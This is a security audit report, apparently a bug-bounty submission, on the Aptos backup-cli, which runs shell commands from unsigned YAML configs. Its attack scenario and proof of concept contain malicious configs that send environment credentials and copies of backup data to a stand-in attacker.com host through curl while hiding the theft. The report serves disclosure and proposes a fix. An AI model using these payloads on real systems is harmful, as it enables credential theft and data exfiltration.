# Audit Report

## Title
Arbitrary Command Execution via Unauthenticated Backup Configuration File Loading

## Summary
The `load_from_file()` function in the backup-cli configuration loader does not verify the authenticity, integrity, or provenance of configuration files. This allows an attacker with file system access to inject malicious backup configurations containing arbitrary bash commands that will be executed with the privileges of the backup process, including access to cloud storage credentials. [1](#0-0) 

## Finding Description
The backup system uses a command adapter pattern where YAML configuration files define arbitrary shell commands for backup operations (create_backup, create_for_write, open_for_read, etc.). When the backup-cli tool loads a configuration file, it performs no authentication checks:

The `load_from_file()` function simply reads the file and deserializes it as YAML with no signature verification, checksum validation, or provenance checking. The configuration contains command strings that are directly executed via bash: [2](#0-1) 

The command execution happens through `tokio::process::Command::new("bash")` with the `-c` flag, executing whatever commands are in the config file. These commands run with access to cloud storage credentials (AWS IAM roles, GCP service accounts, Azure SAS tokens, or explicit API keys): [3](#0-2) 

**Attack Scenario:**

1. Attacker gains file system access (through compromised CI/CD, insider threat, or lateral movement from another vulnerability)
2. Attacker creates malicious config file:
```yaml
commands:
  create_backup: |
    curl https://attacker.com/exfil?creds=$(env | base64)
    echo "$BACKUP_NAME"
  create_for_write: |
    tee >(curl -X POST https://attacker.com/data --data-binary @-) | gzip -c | aws s3 cp - "s3://$BUCKET/$SUB_DIR/$BACKUP_HANDLE/$FILE_NAME"
```

3. Operator runs backup-cli with the malicious config:
```bash
aptos-debugger aptos-db backup continuously \
  --command-adapter-config /path/to/malicious.yaml
```

4. The backup system executes the attacker's commands, which:
   - Exfiltrate cloud credentials and environment variables
   - Intercept and exfiltrate backup data
   - Manipulate backup contents
   - Execute arbitrary code on the backup node [4](#0-3) 

## Impact Explanation
This vulnerability qualifies as **High Severity** under the Aptos bug bounty program criteria:

- **Validator node compromise**: Arbitrary command execution on backup infrastructure running on or connected to validator nodes
- **Credential theft**: Access to cloud storage credentials (AWS access keys, GCP service account tokens, Azure SAS tokens) which could be used to access or manipulate backups across the entire validator network
- **Backup manipulation**: Attacker can corrupt backup data, making disaster recovery impossible or introducing malicious state
- **Data exfiltration**: Sensitive blockchain data and operational metadata can be stolen
- **Lateral movement**: Compromised backup node can be used as pivot point to attack other infrastructure

While this doesn't directly affect consensus or the Move VM, it compromises critical infrastructure that validators depend on for disaster recovery and could be used to stage attacks on the main validator node.

## Likelihood Explanation
**Likelihood: Medium to High**

This vulnerability can be exploited in several realistic scenarios:

1. **Compromised CI/CD Pipeline**: If an attacker gains access to the deployment pipeline, they can inject malicious configs that get deployed to production
2. **Supply Chain Attack**: Operator downloads config from an untrusted source (e.g., community forum, compromised documentation site)
3. **Insider Threat**: Malicious operator or employee with file system access
4. **Lateral Movement**: Attacker exploits unrelated vulnerability to gain limited file access, then escalates privileges via backup-cli
5. **Misconfigured Permissions**: Config files stored with overly permissive file permissions

The attack requires file system access, but this is a realistic privilege level for various attack scenarios. Modern security frameworks emphasize defense-in-depth, where even components with elevated privileges should validate their inputs.

## Recommendation
Implement cryptographic verification of configuration files before loading:

1. **Config File Signing**: Sign configuration files with a trusted key and verify signatures before loading
2. **Checksum Verification**: Maintain a registry of known-good config checksums
3. **Provenance Tracking**: Record and verify the source of configuration files
4. **Restricted Config Paths**: Only load configs from specific, protected directories

**Recommended Fix:**

```rust
impl CommandAdapterConfig {
    pub async fn load_from_file(path: &Path) -> Result<Self> {
        let path_str = path.to_str().unwrap_or_default();
        
        // Verify path is in allowed directory
        Self::verify_config_path(path)?;
        
        let mut file = tokio::fs::File::open(path).await.err_notes(path_str)?;
        let mut content = Vec::new();
        file.read_to_end(&mut content).await.err_notes(path_str)?;
        
        // Verify signature or checksum
        Self::verify_config_integrity(path, &content)?;
        
        Ok(serde_yaml::from_slice(&content)?)
    }
    
    fn verify_config_path(path: &Path) -> Result<()> {
        // Only allow configs from specific trusted directories
        const ALLOWED_CONFIG_DIRS: &[&str] = &[
            "/opt/aptos/etc",
            "/etc/aptos/backup",
        ];
        
        let canonical = path.canonicalize()?;
        ensure!(
            ALLOWED_CONFIG_DIRS.iter().any(|dir| canonical.starts_with(dir)),
            "Config file must be in trusted directory"
        );
        Ok(())
    }
    
    fn verify_config_integrity(path: &Path, content: &[u8]) -> Result<()> {
        // Read accompanying .sig file
        let sig_path = path.with_extension("yaml.sig");
        if !sig_path.exists() {
            bail!("Config signature file not found: {:?}", sig_path);
        }
        
        // Verify Ed25519 signature using trusted public key
        // (Implementation details omitted for brevity)
        
        Ok(())
    }
}
```

Additionally, implement command sandboxing to limit the blast radius:
- Use restricted shell environments (e.g., `rbash`)
- Apply seccomp filters to spawned processes
- Run backup commands in isolated containers with minimal privileges

## Proof of Concept

**Step 1: Create malicious config file (`malicious.yaml`):**

```yaml
env_vars:
  - key: "BUCKET"
    value: "legitimate-backup-bucket"
  - key: "SUB_DIR"
    value: "e1"
commands:
  create_backup: |
    # Exfiltrate environment variables including cloud credentials
    curl -X POST https://attacker.com/exfil \
      -H "Content-Type: application/json" \
      -d "{\"env\": \"$(env | base64 -w0)\", \"backup\": \"$BACKUP_NAME\"}"
    # Return valid output to avoid raising suspicion
    echo "$BACKUP_NAME"
  create_for_write: |
    # Intercept and exfiltrate backup data while still uploading to legitimate storage
    FILE_HANDLE="$BACKUP_HANDLE/$FILE_NAME"
    echo "$FILE_HANDLE"
    exec 1>&-
    tee >(curl -X POST https://attacker.com/data --data-binary @-) | \
      gzip -c | aws s3 cp - "s3://$BUCKET/$SUB_DIR/$FILE_HANDLE"
  open_for_read: |
    aws s3 cp "s3://$BUCKET/$SUB_DIR/$FILE_HANDLE" - | gzip -cd
  save_metadata_line: |
    FILE_HANDLE="metadata/$FILE_NAME"
    echo "$FILE_HANDLE"
    exec 1>&-
    gzip -c | aws s3 cp - "s3://$BUCKET/$SUB_DIR/$FILE_HANDLE"
  list_metadata_files: |
    (aws s3 ls s3://$BUCKET/$SUB_DIR/metadata/ ||:) | sed -ne "s#.* \(.*\)#metadata/\1#p"
```

**Step 2: Run backup-cli with malicious config:**

```bash
# Attacker places malicious.yaml in a location accessible to backup-cli
cargo run -p aptos-debugger -- aptos-db backup continuously \
  --metadata-cache-dir ./mc \
  --state-snapshot-interval-epochs 1 \
  --backup-service-address http://localhost:6186 \
  --command-adapter-config malicious.yaml
```

**Step 3: Observe the attack:**

When the backup process runs:
1. The `create_backup` command executes, exfiltrating all environment variables (including AWS credentials, GCP tokens, etc.) to `https://attacker.com/exfil`
2. The `create_for_write` command intercepts all backup data being written, sending a copy to `https://attacker.com/data` while still uploading to the legitimate bucket
3. The backup appears to function normally, avoiding detection
4. Attacker now has cloud credentials and can access/manipulate all backups

**Expected Result:** Arbitrary bash commands execute with backup-cli privileges, demonstrating complete compromise of the backup infrastructure.

## Notes
This vulnerability represents a critical gap in the backup system's security model. While the primary threat model focuses on consensus and Move VM vulnerabilities, infrastructure security is equally important for validator operations. The backup system handles sensitive data and credentials, making it a high-value target. Defense-in-depth principles require that even privileged components validate their inputs and verify the authenticity of configuration data.

### Citations

**File:** storage/backup/backup-cli/src/storage/command_adapter/config.rs (L83-90)
```rust
    pub async fn load_from_file(path: &Path) -> Result<Self> {
        let path_str = path.to_str().unwrap_or_default();
        let mut file = tokio::fs::File::open(path).await.err_notes(path_str)?;
        let mut content = Vec::new();
        file.read_to_end(&mut content).await.err_notes(path_str)?;

        Ok(serde_yaml::from_slice(&content)?)
    }
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/command.rs (L65-93)
```rust
    pub fn spawn(command: Command) -> Result<Self> {
        debug!("Spawning {:?}", command);

        let mut cmd = tokio::process::Command::new("bash");
        cmd.args(["-c", &command.cmd_str]);
        cmd.stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::inherit());
        for v in command
            .config_env_vars
            .iter()
            .chain(command.param_env_vars.iter())
        {
            cmd.env(&v.key, &v.value);
        }
        let child = cmd.spawn().err_notes(&cmd)?;
        ensure!(
            child.stdin.is_some(),
            "child.stdin is None. cmd: {:?}",
            &command,
        );
        ensure!(
            child.stdout.is_some(),
            "child.stdout is None. cmd: {:?}",
            &command,
        );

        Ok(Self { command, child })
    }
```

**File:** terraform/helm/fullnode/templates/_backup.tpl (L1-59)
```text
{{- define "backup.backupEnvironment" -}}
# awscli writes to ~/.aws/cli/cache/
# gsutil writes to ~/.gsutil/
# azcopy writes to ~/.azcopy/
- name: HOME
  value: /tmp
{{- if hasPrefix "s3" (toString .config.location) }}
- name: BUCKET
  value: {{ .config.s3.bucket }}
{{- end }}
{{- if hasPrefix "gcs" (toString .config.location) }}
- name: BUCKET
  value: {{ .config.gcs.bucket }}
{{- end }}
{{- if hasPrefix "azure" (toString .config.location) }}
- name: ACCOUNT
  value: {{ .config.azure.account }}
- name: CONTAINER
  value: {{ .config.azure.container }}
- name: SAS
  value: {{ .config.azure.sas }}
{{- end }}
{{- if hasPrefix "r2" (toString .config.location) }}
- name: BUCKET
  value: {{ .config.r2.bucket }}
- name: R2_ENDPOINT_URL
  value: {{ .config.r2.endpoint_url }}
- name: AWS_ACCESS_KEY_ID
  valueFrom:
    secretKeyRef:
      name: r2-credentials
      key: access-key-id
- name: AWS_SECRET_ACCESS_KEY
  valueFrom:
    secretKeyRef:
      name: r2-credentials
      key: secret-access-key
{{- end }}
{{- if hasPrefix "scw_s3" (toString .config.location) }}
- name: AWS_ACCESS_KEY_ID
  value: {{ .config.scw_s3.access_key }}
- name: AWS_SECRET_ACCESS_KEY
  value: {{ .config.scw_s3.secret_key }}
- name: AWS_DEFAULT_REGION
  value: {{ .config.scw_s3.region }}
- name: BUCKET
  value: {{ .config.scw_s3.bucket }}
- name: ENDPOINT_URL
  value: {{ .config.scw_s3.endpoint_url }}
{{- end }}
{{- if hasPrefix "oci" (toString .config.location) }}
- name: ACCESS_URI
  value: {{ .config.oci.access_uri }}
- name: ENDPOINT
  value: {{ .config.oci.endpoint }}
{{- end }}
- name: SUB_DIR
  value: e{{ .era }}
{{- end -}}
```

**File:** storage/backup/backup-cli/src/storage/mod.rs (L234-241)
```rust
impl DBToolStorageOpt {
    pub async fn init_storage(self) -> Result<Arc<dyn BackupStorage>> {
        Ok(if self.local_fs_dir.is_some() {
            Arc::new(LocalFs::new_with_opt(self.local_fs_dir.unwrap()))
        } else {
            Arc::new(CommandAdapter::new_with_opt(self.command_adapter_config.unwrap()).await?)
        })
    }
```
